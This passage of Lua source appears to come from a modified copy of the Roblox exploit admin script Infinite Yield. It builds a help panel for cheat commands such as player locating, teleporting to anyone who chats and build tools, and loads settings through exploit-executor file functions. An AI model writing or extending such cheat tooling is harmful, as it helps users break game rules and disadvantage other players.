				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl152[1] = 79
			tbl152[2] = "TextLabel"
			tbl152[3] = tbl153
		end

		local tbl153
		tbl153 = {}

		do
			local tbl154 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 91),
				Size = UDim2.new(1, -8, 0, 16),
				Text = ";locate %blue-friends (gets players in blue team who aren't your friends)",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl153[1] = 80
			tbl153[2] = "TextLabel"
			tbl153[3] = tbl154
		end

		local tbl154
		tbl154 = {}

		do
			local tbl155 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 46),
				Size = UDim2.new(1, -8, 0, 16),
				Text = ";locate noob,noob2,bob",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl154[1] = 81
			tbl154[2] = "TextLabel"
			tbl154[3] = tbl155
		end

		local tbl155
		tbl155 = {}

		do
			local tbl156 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 120),
				Size = UDim2.new(1, -8, 0, 16),
				Text = "Put ! before a command to run it with the last arguments it was ran with:",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl155[1] = 82
			tbl155[2] = "TextLabel"
			tbl155[3] = tbl156
		end

		local tbl156
		tbl156 = {}

		do
			local tbl157 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 136),
				Size = UDim2.new(1, -8, 0, 32),
				Text = "After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl156[1] = 83
			tbl156[2] = "TextLabel"
			tbl156[3] = tbl157
		end

		local tbl157
		tbl157 = {}

		do
			local tbl158 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Name = "Section",
				Parent = { 7 },
				Size = UDim2.new(1, 0, 0, 154),
				ZIndex = 10,
			}

			tbl157[1] = 84
			tbl157[2] = "Frame"
			tbl157[3] = tbl158
		end

		local tbl158
		tbl158 = {}

		do
			local tbl159 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Header",
				Parent = { 84 },
				Position = UDim2.new(0, 8, 0, 5),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Command Looping",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 20,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl158[1] = 85
			tbl158[2] = "TextLabel"
			tbl158[3] = tbl159
		end

		local tbl159
		tbl159 = {}

		do
			local tbl160 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 84 },
				Position = UDim2.new(0, 8, 0, 30),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Form: [How many times it loops]^[delay (optional)]^[command]",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 15,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl159[1] = 86
			tbl159[2] = "TextLabel"
			tbl159[3] = tbl160
		end

		local tbl160
		tbl160 = {}

		do
			local tbl161 = {
				BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
				BorderSizePixel = 0,
				Name = "Line",
				Parent = { 84 },
				Position = UDim2.new(0, 10, 1, -1),
				Size = UDim2.new(1, -20, 0, 1),
				ZIndex = 10,
			}

			tbl160[1] = 87
			tbl160[2] = "Frame"
			tbl160[3] = tbl161
		end

		local tbl161
		tbl161 = {}

		do
			local tbl162 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 84 },
				Position = UDim2.new(0, 8, 0, 50),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Use the 'breakloops' command to stop all running loops.",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 15,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl161[1] = 88
			tbl161[2] = "TextLabel"
			tbl161[3] = tbl162
		end

		local tbl162
		tbl162 = {}

		do
			local tbl163 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 84 },
				Position = UDim2.new(0, 8, 0, 80),
				Size = UDim2.new(1, -8, 0, 16),
				Text = "Examples:",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl162[1] = 89
			tbl162[2] = "TextLabel"
			tbl162[3] = tbl163
		end

		local tbl163
		tbl163 = {}

		do
			local tbl164 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 84 },
				Position = UDim2.new(0, 8, 0, 98),
				Size = UDim2.new(1, -8, 0, 42),
				Text = [[;5^btools - gives you 5 sets of btools
;10^3^drophats - drops your hats every 3 seconds 10 times
;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100]],
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl163[1] = 90
			tbl163[2] = "TextLabel"
			tbl163[3] = tbl164
		end

		do
			local tbl164 = {}

			local tbl165 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Name = "Section",
				Parent = { 7 },
				Size = UDim2.new(1, 0, 0, 120),
				ZIndex = 10,
			}

			tbl164[1] = 91
			tbl164[2] = "Frame"
			tbl164[3] = tbl165
			local tbl166 = {}

			local tbl167 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Header",
				Parent = { 91 },
				Position = UDim2.new(0, 8, 0, 5),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Execute Multiple Commands at Once",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 20,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl166[1] = 92
			tbl166[2] = "TextLabel"
			tbl166[3] = tbl167
			local tbl168 = {}

			local tbl169 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 91 },
				Position = UDim2.new(0, 8, 0, 30),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "You can execute multiple commands at once using \"\\\"",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl168[1] = 93
			tbl168[2] = "TextLabel"
			tbl168[3] = tbl169
			local tbl170 = {}

			local tbl171 = {
				BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
				BorderSizePixel = 0,
				Name = "Line",
				Parent = { 91 },
				Position = UDim2.new(0, 10, 1, -1),
				Size = UDim2.new(1, -20, 0, 1),
				ZIndex = 10,
			}

			tbl170[1] = 94
			tbl170[2] = "Frame"
			tbl170[3] = tbl171
			local tbl172 = {}

			local tbl173 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 91 },
				Position = UDim2.new(0, 8, 0, 60),
				Size = UDim2.new(1, -8, 0, 16),
				Text = "Examples:",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl172[1] = 95
			tbl172[2] = "TextLabel"
			tbl172[3] = tbl173
			local tbl174 = {}

			local tbl175 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 91 },
				Position = UDim2.new(0, 8, 0, 78),
				Size = UDim2.new(1, -8, 0, 32),
				Text = ";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl174[1] = 96
			tbl174[2] = "TextLabel"
			tbl174[3] = tbl175
			local tbl176 = {}

			local tbl177 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Name = "Section",
				Parent = { 7 },
				Size = UDim2.new(1, 0, 0, 75),
				ZIndex = 10,
			}

			tbl176[1] = 97
			tbl176[2] = "Frame"
			tbl176[3] = tbl177
			local tbl178 = {}

			local tbl179 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Header",
				Parent = { 97 },
				Position = UDim2.new(0, 8, 0, 5),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Browse Command History",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 20,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl178[1] = 98
			tbl178[2] = "TextLabel"
			tbl178[3] = tbl179
			local tbl180 = {}

			local tbl181 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "Text",
				Parent = { 97 },
				Position = UDim2.new(0, 8, 0, 30),
				Size = UDim2.new(1, -8, 0, 32),
				Text = "While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl180[1] = 99
			tbl180[2] = "TextLabel"
			tbl180[3] = tbl181
			local tbl182 = {}

			local tbl183 = {
				BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
				BorderSizePixel = 0,
				Name = "Line",
				Parent = { 97 },
				Position = UDim2.new(0, 10, 1, -1),
				Size = UDim2.new(1, -20, 0, 1),
				ZIndex = 10,
			}

			tbl182[1] = 100
			tbl182[2] = "Frame"
			tbl182[3] = tbl183
			tbl5[1] = tbl6
			tbl5[2] = tbl8
			tbl5[3] = tbl10
			tbl5[4] = tbl12
			tbl5[5] = tbl14
			tbl5[6] = tbl16
			tbl5[7] = tbl18
			tbl5[8] = { 8, "UIListLayout", { Parent = { 7 }, SortOrder = 2 } }
			tbl5[9] = tbl20
			tbl5[10] = tbl22
			tbl5[11] = tbl24
			tbl5[12] = tbl26
			tbl5[13] = tbl28
			tbl5[14] = { 14, "UIListLayout", { Parent = { 13 }, SortOrder = 2 } }
			tbl5[15] = tbl30
			tbl5[16] = tbl32
			tbl5[17] = tbl34
			tbl5[18] = tbl36
			tbl5[19] = tbl38
			tbl5[20] = tbl40
			tbl5[21] = tbl42
			tbl5[22] = tbl44
			tbl5[23] = tbl46
			tbl5[24] = tbl48
			tbl5[25] = tbl50
			tbl5[26] = tbl52
			tbl5[27] = tbl54
			tbl5[28] = tbl56
			tbl5[29] = tbl58
			tbl5[30] = tbl60
			tbl5[31] = tbl62
			tbl5[32] = tbl64
			tbl5[33] = tbl66
			tbl5[34] = tbl68
			tbl5[35] = tbl70
			tbl5[36] = tbl72
			tbl5[37] = tbl74
			tbl5[38] = tbl76
			tbl5[39] = tbl78
			tbl5[40] = tbl80
			tbl5[41] = tbl82
			tbl5[42] = tbl84
			tbl5[43] = tbl86
			tbl5[44] = tbl88
			tbl5[45] = tbl90
			tbl5[46] = tbl92
			tbl5[47] = tbl94
			tbl5[48] = tbl96
			tbl5[49] = tbl98
			tbl5[50] = tbl100
			tbl5[51] = tbl102
			tbl5[52] = tbl104
			tbl5[53] = tbl106
			tbl5[54] = tbl108
			tbl5[55] = tbl110
			tbl5[56] = tbl112
			tbl5[57] = tbl114
			tbl5[58] = tbl116
			tbl5[59] = tbl118
			tbl5[60] = tbl120
			tbl5[61] = tbl122
			tbl5[62] = tbl124
			tbl5[63] = tbl126
			tbl5[64] = tbl128
			tbl5[65] = tbl130
			tbl5[66] = tbl132
			tbl5[67] = tbl134
			tbl5[68] = tbl136
			tbl5[69] = tbl138
			tbl5[70] = tbl140
			tbl5[71] = tbl142
			tbl5[72] = tbl144
			tbl5[73] = tbl146
			tbl5[74] = tbl147
			tbl5[75] = tbl148
			tbl5[76] = tbl149
			tbl5[77] = tbl150
			tbl5[78] = tbl151
			tbl5[79] = tbl152
			tbl5[80] = tbl153
			tbl5[81] = tbl154
			tbl5[82] = tbl155
			tbl5[83] = tbl156
			tbl5[84] = tbl157
			tbl5[85] = tbl158
			tbl5[86] = tbl159
			tbl5[87] = tbl160
			tbl5[88] = tbl161
			tbl5[89] = tbl162
			tbl5[90] = tbl163
			tbl5[91] = tbl164
			tbl5[92] = tbl166
			tbl5[93] = tbl168
			tbl5[94] = tbl170
			tbl5[95] = tbl172
			tbl5[96] = tbl174
			tbl5[97] = tbl176
			tbl5[98] = tbl178
			tbl5[99] = tbl180
			tbl5[100] = tbl182
		end
	end

	do
		local tbl146 = {}

		local tbl147 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Name = "Section",
			Parent = { 7 },
			Size = UDim2.new(1, 0, 0, 75),
			ZIndex = 10,
		}

		tbl146[1] = 101
		tbl146[2] = "Frame"
		tbl146[3] = tbl147
		local tbl148 = {}

		local tbl149 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 4,
			Name = "Header",
			Parent = { 101 },
			Position = UDim2.new(0, 8, 0, 5),
			Size = UDim2.new(1, -8, 0, 20),
			Text = "Autocomplete in the Command Bar",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 20,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl148[1] = 102
		tbl148[2] = "TextLabel"
		tbl148[3] = tbl149
		local tbl150 = {}

		local tbl151 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 3,
			Name = "Text",
			Parent = { 101 },
			Position = UDim2.new(0, 8, 0, 30),
			Size = UDim2.new(1, -8, 0, 32),
			Text = "While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl150[1] = 103
		tbl150[2] = "TextLabel"
		tbl150[3] = tbl151
		local tbl152 = {}

		local tbl153 = {
			BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
			BorderSizePixel = 0,
			Name = "Line",
			Parent = { 101 },
			Position = UDim2.new(0, 10, 1, -1),
			Size = UDim2.new(1, -20, 0, 1),
			ZIndex = 10,
		}

		tbl152[1] = 104
		tbl152[2] = "Frame"
		tbl152[3] = tbl153
		local tbl154 = {}

		local tbl155 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Name = "Section",
			Parent = { 7 },
			Size = UDim2.new(1, 0, 0, 175),
			ZIndex = 10,
		}

		tbl154[1] = 105
		tbl154[2] = "Frame"
		tbl154[3] = tbl155
		local tbl156 = {}

		local tbl157 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 4,
			Name = "Header",
			Parent = { 105 },
			Position = UDim2.new(0, 8, 0, 5),
			Size = UDim2.new(1, -8, 0, 20),
			Text = "Using Event Binds",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 20,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl156[1] = 106
		tbl156[2] = "TextLabel"
		tbl156[3] = tbl157
		local tbl158 = {}

		local tbl159 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 3,
			Name = "Text",
			Parent = { 105 },
			Position = UDim2.new(0, 8, 0, 30),
			Size = UDim2.new(1, -8, 0, 32),
			Text = "Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl158[1] = 107
		tbl158[2] = "TextLabel"
		tbl158[3] = tbl159
		local tbl160 = {}

		local tbl161 = {
			BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
			BorderSizePixel = 0,
			Name = "Line",
			Parent = { 105 },
			Position = UDim2.new(0, 10, 1, -1),
			Size = UDim2.new(1, -20, 0, 1),
			ZIndex = 10,
		}

		tbl160[1] = 108
		tbl160[2] = "Frame"
		tbl160[3] = tbl161
		local tbl162 = {}

		local tbl163 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 3,
			Name = "Text",
			Parent = { 105 },
			Position = UDim2.new(0, 8, 0, 70),
			Size = UDim2.new(1, -8, 0, 48),
			Text = "Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl162[1] = 109
		tbl162[2] = "TextLabel"
		tbl162[3] = tbl163
		local tbl164 = {}

		local tbl165 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 4,
			Name = "Text",
			Parent = { 105 },
			Position = UDim2.new(0, 8, 0, 130),
			Size = UDim2.new(1, -8, 0, 16),
			Text = "Example:",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			TextYAlignment = 0,
			ZIndex = 10,
		}

		tbl164[1] = 110
		tbl164[2] = "TextLabel"
		tbl164[3] = tbl165
		local tbl166 = {}

		local tbl167 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 3,
			Name = "Text",
			Parent = { 105 },
			Position = UDim2.new(0, 8, 0, 148),
			Size = UDim2.new(1, -8, 0, 16),
			Text = "Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			TextYAlignment = 0,
			ZIndex = 10,
		}

		tbl166[1] = 111
		tbl166[2] = "TextLabel"
		tbl166[3] = tbl167
		local tbl168 = {}

		local tbl169 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Name = "Section",
			Parent = { 7 },
			Size = UDim2.new(1, 0, 0, 105),
			ZIndex = 10,
		}

		tbl168[1] = 112
		tbl168[2] = "Frame"
		tbl168[3] = tbl169
		local tbl170 = {}

		local tbl171 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 4,
			Name = "Header",
			Parent = { 112 },
			Position = UDim2.new(0, 8, 0, 5),
			Size = UDim2.new(1, -8, 0, 20),
			Text = "Get Further Help",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 20,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl170[1] = 113
		tbl170[2] = "TextLabel"
		tbl170[3] = tbl171
		local tbl172 = {}

		local tbl173 = {
			BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 1,
			Font = 3,
			Name = "Text",
			Parent = { 112 },
			Position = UDim2.new(0, 8, 0, 30),
			Size = UDim2.new(1, -8, 0, 32),
			Text = "You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 14,
			TextWrapped = true,
			TextXAlignment = 0,
			ZIndex = 10,
		}

		tbl172[1] = 114
		tbl172[2] = "TextLabel"
		tbl172[3] = tbl173
		local tbl174 = {}

		local tbl175 = {
			BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
			BorderSizePixel = 0,
			Name = "Line",
			Parent = { 112 },
			Position = UDim2.new(0, 10, 1, -1),
			Size = UDim2.new(1, -20, 0, 1),
			Visible = false,
			ZIndex = 10,
		}

		tbl174[1] = 115
		tbl174[2] = "Frame"
		tbl174[3] = tbl175
		local tbl176 = {}

		local tbl177 = {
			BackgroundColor3 = Color3.new(0.48627451062202, 0.61960786581039, 0.85098040103912),
			BorderColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
			Font = 4,
			Name = "InviteButton",
			Parent = { 112 },
			Position = UDim2.new(0, 5, 0, 75),
			Size = UDim2.new(1, -10, 0, 25),
			Text = "Copy Discord Invite Link (https://discord.io/infiniteyield)",
			TextColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
			TextSize = 16,
			ZIndex = 10,
		}

		tbl176[1] = 116
		tbl176[2] = "TextButton"
		tbl176[3] = tbl177
		tbl5[101] = tbl146
		tbl5[102] = tbl148
		tbl5[103] = tbl150
		tbl5[104] = tbl152
		tbl5[105] = tbl154
		tbl5[106] = tbl156
		tbl5[107] = tbl158
		tbl5[108] = tbl160
		tbl5[109] = tbl162
		tbl5[110] = tbl164
		tbl5[111] = tbl166
		tbl5[112] = tbl168
		tbl5[113] = tbl170
		tbl5[114] = tbl172
		tbl5[115] = tbl174
		tbl5[116] = tbl176
	end

	do
		local v = _create(tbl5)

		for _, descendant in pairs(v.Content.List:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				table.insert(text1, descendant)
			end
		end

		table.insert(scroll, v.Content.List)
		table.insert(shade1, v.Content)
		table.insert(shade2, v.TopBar)
		v.Name = randomString()

		v.TopBar.Close.MouseButton1Click:Connect(function()
			v:TweenPosition(UDim2.new(0.5, -250, 0, -500), "InOut", "Quart", 0.5, true, nil)
		end)

		local inviteButton = v:FindFirstChild("InviteButton", true)
		local v2 = nil

		inviteButton.MouseButton1Click:Connect(function()
			if setclipboard or toclipboard or set_clipboard or Clipboard and Clipboard.set then
				inviteButton.Text = "Disabled"
			else
				inviteButton.Text = "Disabled"
			end

			local now = tick()
			v2 = now
			wait(2)
			if v2 ~= now then
				return
			end
			inviteButton.Text = "Disabled"
		end)

		dragGUI(v)
		v.Parent = PARENT

		ReferenceButton.MouseButton1Click:Connect(function()
			v:TweenPosition(UDim2.new(0.5, -250, 0.5, -150), "InOut", "Quart", 0.5, true, nil)
		end)
	end
end

reference = decodePayload()
currentShade1 = Color3.fromRGB(36, 36, 37)
currentShade2 = Color3.fromRGB(46, 46, 47)
currentShade3 = Color3.fromRGB(78, 78, 79)
currentText1 = Color3.new(1, 1, 1)
currentText2 = Color3.new(0, 0, 0)
currentScroll = Color3.fromRGB(78, 78, 79)

defaultsettings = {
	prefix = ";",
	StayOpen = false,
	espTransparency = 0.3,
	keepIY = true,
	logsEnabled = false,
	jLogsEnabled = false,
	aliases = {},
	binds = {},
	WayPoints = {},
	PluginsTable = {},
	currentShade1 = { currentShade1.R, currentShade1.G, currentShade1.B },
	currentShade2 = { currentShade2.R, currentShade2.G, currentShade2.B },
	currentShade3 = { currentShade3.R, currentShade3.G, currentShade3.B },
	currentText1 = { currentText1.R, currentText1.G, currentText1.B },
	currentText2 = { currentText2.R, currentText2.G, currentText2.B },
	currentScroll = { currentScroll.R, currentScroll.G, currentScroll.B },
	eventBinds = eventEditor.SaveData(),
	vapeHudEnabled = true,
	vapeHudKey = "RightShift",
}

defaults = HttpService:JSONEncode(defaultsettings)
nosaves = false
local eventBinds
eventBinds = nil

saves = function()
	if writefileExploit() then
		if pcall(function()
			readfile("IY_FE.iy")
		end) then
			if readfile("IY_FE.iy") ~= nil then
				local ok, result = pcall(function()
					local data = HttpService:JSONDecode(readfile("IY_FE.iy"))

					if data.prefix ~= nil then
						prefix = data.prefix
					else
						prefix = ";"
					end

					if data.StayOpen ~= nil then
						StayOpen = data.StayOpen
					else
						StayOpen = false
					end

					if data.keepIY ~= nil then
						KeepInfYield = data.keepIY
					else
						KeepInfYield = true
					end

					if data.espTransparency ~= nil then
						espTransparency = data.espTransparency
					else
						espTransparency = 0.3
					end

					if data.logsEnabled ~= nil then
						logsEnabled = data.logsEnabled
					else
						logsEnabled = false
					end

					if data.jLogsEnabled ~= nil then
						jLogsEnabled = data.jLogsEnabled
					else
						jLogsEnabled = false
					end

					if data.aliases ~= nil then
						aliases = data.aliases
					else
						aliases = {}
					end

					if data.binds ~= nil then
						binds = data.binds or {}
					else
						binds = {}
					end

					if data.spawnCmds ~= nil then
						spawnCmds = data.spawnCmds
					end

					if data.WayPoints ~= nil then
						AllWaypoints = data.WayPoints
					else
						WayPoints = {}
						AllWaypoints = {}
					end

					if data.PluginsTable ~= nil then
						PluginsTable = data.PluginsTable
					else
						PluginsTable = {}
					end

					if data.currentShade1 ~= nil then
						currentShade1 = Color3.new(data.currentShade1[1], data.currentShade1[2], data.currentShade1[3])
					end

					if data.currentShade2 ~= nil then
						currentShade2 = Color3.new(data.currentShade2[1], data.currentShade2[2], data.currentShade2[3])
					end

					if data.currentShade3 ~= nil then
						currentShade3 = Color3.new(data.currentShade3[1], data.currentShade3[2], data.currentShade3[3])
					end

					if data.currentText1 ~= nil then
						currentText1 = Color3.new(data.currentText1[1], data.currentText1[2], data.currentText1[3])
					end

					if data.currentText2 ~= nil then
						currentText2 = Color3.new(data.currentText2[1], data.currentText2[2], data.currentText2[3])
					end

					if data.currentScroll ~= nil then
						currentScroll = Color3.new(data.currentScroll[1], data.currentScroll[2], data.currentScroll[3])
					end

					if data.eventBinds ~= nil then
						eventBinds = data.eventBinds
					end

					if data.vapeHudEnabled ~= nil then
						local vapeHudEnabled = data.vapeHudEnabled
						getgenv().VapeHudEnabled = vapeHudEnabled
					else
						getgenv().VapeHudEnabled = true
					end

					if data.vapeHudKey ~= nil then
						local str = tostring(data.vapeHudKey)

						pcall(function()
							local v = Enum.KeyCode[str]

							if v then
								getgenv().VapeHudKey = v
							end
						end)
					else
						local rightShift2 = Enum.KeyCode.RightShift
						getgenv().VapeHudKey = rightShift2
					end

					if VapeGui then
						VapeGui.Enabled = getgenv().VapeHudEnabled ~= false
					end

					if getgenv().updateVapeHudSettingsUI then
						getgenv().updateVapeHudSettingsUI(getgenv().VapeHudEnabled ~= false)
					end
				end)

				if not ok then
					warn("Save Json Error:", result)
					warn("Overwriting Save File")
					writefileCooldown("IY_FE.iy", defaults)
					wait()
					saves()
				end
			else
				writefileCooldown("IY_FE.iy", defaults)
				wait()
				saves()
			end
		else
			writefileCooldown("IY_FE.iy", defaults)
			wait()

			if pcall(function()
				readfile("IY_FE.iy")
			end) then
				saves()
			else
				nosaves = true
				prefix = ";"
				StayOpen = false
				KeepInfYield = true
				espTransparency = 0.3
				logsEnabled = false
				jLogsEnabled = false
				aliases = {}
				binds = {}
				WayPoints = {}
				PluginsTable = {}
				getgenv().VapeHudEnabled = true
				local rightShift2 = Enum.KeyCode.RightShift
				getgenv().VapeHudKey = rightShift2

				if VapeGui then
					VapeGui.Enabled = true
				end

				if getgenv().updateVapeHudSettingsUI then
					getgenv().updateVapeHudSettingsUI(true)
				end

				local frame2 = Instance.new("Frame")
				local frame3 = Instance.new("Frame")
				local textLabel = Instance.new("TextLabel")
				local frame4 = Instance.new("Frame")
				local textLabel2 = Instance.new("TextLabel")
				local textButton2 = Instance.new("TextButton")
				local imageLabel = Instance.new("ImageLabel")
				frame2.Name = randomString()
				frame2.Parent = PARENT
				frame2.Active = true
				frame2.BackgroundTransparency = 1
				frame2.Position = UDim2.new(0.5, -180, 0, 290)
				frame2.Size = UDim2.new(0, 360, 0, 20)
				frame2.ZIndex = 10
				frame3.Name = "background"
				frame3.Parent = frame2
				frame3.Active = true
				frame3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
				frame3.BorderSizePixel = 0
				frame3.Position = UDim2.new(0, 0, 0, 20)
				frame3.Size = UDim2.new(0, 360, 0, 205)
				frame3.ZIndex = 10
				textLabel.Name = "Directions"
				textLabel.Parent = frame3
				textLabel.BackgroundTransparency = 1
				textLabel.BorderSizePixel = 0
				textLabel.Position = UDim2.new(0, 10, 0, 10)
				textLabel.Size = UDim2.new(0, 340, 0, 185)
				textLabel.Font = Enum.Font.SourceSans
				textLabel.TextSize = 14

				textLabel.Text = [[There was a problem writing a save file to your PC.

Please contact the developer/support team for your exploit and tell them writefile is not working.

Your settings, keybinds, waypoints, and aliases will not save if you continue.

Things to try:
> Make sure a 'workspace' folder is located in the same folder as your exploit
> If your exploit is inside of a zip/rar file, extract it.
> Rejoin the game and try again or restart your PC and try again.]]

				textLabel.TextColor3 = Color3.new(1, 1, 1)
				textLabel.TextWrapped = true
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextYAlignment = Enum.TextYAlignment.Top
				textLabel.ZIndex = 10
				frame4.Name = "shadow"
				frame4.Parent = frame2
